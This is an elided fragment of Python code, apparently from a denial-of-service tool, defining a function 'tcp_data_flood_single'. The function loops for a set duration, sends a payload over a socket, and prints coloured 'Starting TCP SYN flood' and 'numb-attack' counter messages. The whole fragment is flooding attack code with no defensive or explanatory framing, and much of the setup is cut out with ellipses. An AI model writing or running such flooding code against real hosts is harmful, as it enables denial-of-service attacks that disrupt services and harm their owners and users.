...
def tcp_data_flood_single(ip, port, duration, packet_size):
    ...
    try:
        ...
        while time.time() < end_time:
            time.sleep(0.2)
            print("\033[48;5;3mStarting TCP SYN flood 0ne-Threads \033[0m \033[91m" +str(ip)+ " \033[33m0k..!")
            print("\033[33m Starting TCP SYN flood 0ne-Threads \033[32m" +str(packet_count)+ " \033[97mnumb-attack\033[0m") 
            sock.send(payload)
            packet_count += 1
    except Exception as e:
